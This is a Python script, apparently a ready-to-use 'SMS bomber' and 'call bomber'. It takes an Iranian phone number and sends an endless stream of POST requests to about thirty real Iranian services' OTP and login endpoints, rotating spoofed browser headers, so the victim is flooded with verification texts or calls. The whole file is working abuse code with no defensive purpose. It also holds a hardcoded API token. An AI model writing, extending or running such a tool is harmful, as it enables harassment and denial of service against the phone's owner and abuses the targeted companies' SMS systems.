import requests,time,random,os,json
heads = [
        {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': '*/*'
        },
        {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
        },
        {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
        },
        {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
        },
        {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
        'Accept': '*/*'
        },
]
os.system('cls') 

def fixNumber(number):
    if number[0:3] == '+98':
        number = number[3:]
    if number[0] == '0':
        number = number[1:]  
    return number

def checkNumber(notCheckedNumber):
    number = notCheckedNumber.strip() 
    number = fixNumber(number) 
    while len(number) != 10 or number[0] == '0' or not number.isdigit():
        print("Incorrect number format. Please try again.")
        number = input("Enter the phone number (10 digits): ")
        number = fixNumber(number)
    os.system('cls') 
    print("Number:", number)
    num98 = '+98' + number
    num0 = '0' + number
    return number, num98, num0

notCheckedNumber = input("""
Hello there!                 
==================      
The number must be like this : 9123456789
==================
Enter the phone number (10 digits): """)

number, num98, num0 = checkNumber(notCheckedNumber)
# print(f"Number with +98 prefix: {num98}")
# print(f"Number with 0 prefix: {num0}")

smsApis = {
    'c.ketab': {
        'url': 'https://c.ketab.ir/api/api/services/app/Account/SendValidationCode',
        'request': {"mobileNumber": num0},
        'status': True
    },
    'irantic': {
        'url': 'https://www.irantic.com/api/login/authenticate',
        'request': {"mobile": num0},
        'status': True
    },
    'lendo': {
        'url': 'https://api.lendo.ir/api/customer/auth/send-otp',
        'request': {"mobile": num0},
        'status': True
    },
    'pindo': {
        'url': 'https://api.pindo.ir/v1/user/login-register/',
        'request': {"phone": num0},
        'status': True
    },
    'wisgoon': {
        'url': 'https://gateway.wisgoon.com/api/v1/auth/login/',
        'request': {"token":"e622c330c77a17c8426e638d7a85da6c2ec9f455","phone":"09123456789","recaptcha-response":"03AFcfHw0_ZNLVs3UQyU"},
        'status': True
    },
    'gap': {
        'url': 'https://core.gap.im/v1/user/add.json?mobile={0}'.format(num98),
        'status': True
    },
    'timche': {
        'url': 'https://api.timcheh.com/auth/otp/send',
        'request': {"mobile": num0},
        'status': True
    },
    'hamrah mechanic': {
        'url': 'https://www.hamrah-mechanic.com/membersignin/',
        'request': {
            "PhoneNumber": num0,
            "prevDomainUrl": "https://www.google.com/",
            "landingPageUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "prevUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
            "referrer": "https://www.google.com/"
        },
        'status': True
    },
    'miare': {
        'url': 'https://www.miare.ir/api/otp/driver/request/',
        'request': {"phone_number": num0},
        'status': True
    },
    'gapfilm': {
        'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login',
        'request': {"Type": 3, "Username": num0},
        'status': True
    },
    'banimode': {
        'url': 'https://mobapi.banimode.com/api/v2/auth/request',
        'request': {"phone": num0},
        'status': True
    },
    'snappfood': {
        'url': 'https://api.snappfood.biz/v1/u/send-otp',
        'request': {"phone":num0},
        'status': True
    },
    'foodforkish': {
        'url': 'https://foodforkish.ir/public/api/generate-otp-for-login',
        'request': {"phone": num0, "email": "09123456789@foodforkish.ir"},
        'status': True
    },
    'bazar': {
        'url': 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest',
        'request': {"properties":
                    {"language":2,"clientID":"cigvc5y1q0u8qf0ryfkn41t29tloxql1",
                     "deviceID":"cigvc5y1q0u8qf0ryfkn41t29tloxql1",
                     "clientVersion":"web"},
                     "singleRequest":{"getOtpTokenRequest":{"username":num0}}
                    },
        'status': True
    },
    'zoodex': {
        'url': 'https://admin.zoodex.ir/api/v1/login/check',
        'request': {"mobile": num0},
        'status': True
    },
    'momifood': {
        'url': 'https://mamifood.org/Registration.aspx/SendValidationCode',
        'request': {"Phone": num0, "did": "a4d1daf8-6ae4-49df-8ba9-2e870ce39e0c"},
        'status': True
    },
    'behtarino': {
        'url': 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
        'request': {"phone":num0},
        'status': True
    },
    'namava': {
        'url': 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
        'request': {"UserName": num98},
        'status': True
    },
    'balad': {
        'url': 'https://account.api.balad.ir/api/web/auth/login/',
        'request': {"phone_number": num0, "os_type": "W"},
        'status': True
    },
    'poltak': {
        'url': 'https://poltalk.me/api/v1/auth/phone',
        'request': {"phone": num0},
        'status': True
    },
    'quby': {
        'url': 'https://quby.ir/AppApi/Api/User/RequestOTP',
        'request': {'phone': num0},
        'status': True
    },
    'setare1': {
        'url': 'https://api.setareyek.ir/V2/User/Register',
        'request': {"PhoneNumber": num0},
        'status': True
    },
    'komoda': {
        'url': 'https://api.komodaa.com/api/v2.6/loginRC/request',
        'request': {'phone_number': num0},
        'status': True
    },
    'alibaba': {
        'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp',
        'request': {'phoneNumber': number},
        'status': True
    },
    'divar': {
        'url': 'https://api.divar.ir/v5/auth/authenticate',
        'request': {"phone": number},
        'status': True
    },
    'tapsi': {
        'url': 'https://api.tapsi.cab/api/v2.2/user',
        'request': {"credential": {"phoneNumber": num0, "role": "PASSENGER"}, "otpOption": "SMS"},
        'status': True
    },
    'okala': {
        'url': 'https://api-react.okala.com/C/CustomerAccount/OTPRegister',
        'request': {"mobile": num0, "confirmTerms": 'true', "notRobot": 'false'},
        'status': True
    }
}
# ----------------------------------------------------
callApis = {
    'banimod': {
        'url': 'https://mobapi.banimode.com/api/v2/auth/request',
        'request': {"phone":num0,"type":"call"} ,
        'status': 'call'
    },
    'komoda': {
        'url': 'https://api.komodaa.com/api/v2.6/loginRC/request',
        'request': {'phone_number':num0} ,
        'status': 'call'
    },
    'alibaba': {
        'url': 'https://ws.alibaba.ir/api/v3/account/call/otp',
        'request': {"phoneNumber":number} ,
        'status': 'call'
    },
    'gapfilm': {
        'url': 'https://core.gap.im/v1/user/resendCode.json?mobile=+98{0}&type=IVR'.format(number) ,
        'status': 'call'
    },
}


def checkResponse(responseCode):
    return int(responseCode) == 200 or int(responseCode) == 429

try:
    op = int(input('''
======================    
Enter an option(1 or 2) then press inter:
    1:sms bomber
    2:call bomber
======================  
                     
specify an option: '''))
except:
    raise ("you have entered not digit letters!")

if 0<op < 3:
    selectedService = smsApis if op ==1 else callApis
    while True:
        random_head = random.choice(heads)
        for webName,req in selectedService.items() :
            try:
                webApi = req['url']
                if req['request']:
                    webReq = req['request']
                    postReq = requests.post(webApi, json=webReq,headers=random_head)
                else:
                    postReq = requests.post(webApi)
                print(webName,postReq.status_code)
                if req['status'] == 'call':
                    time.sleep(10)
                if not checkResponse(postReq.status_code) and req['status'] == True :
                    req['status'] = False  
                    print(webName,postReq.status_code,"need to check")
            except:
                req['status'] = False
        time.sleep(10)
else:
    print(f"{op} is a wrong value!!")
    print("enter a value between 1,2 ")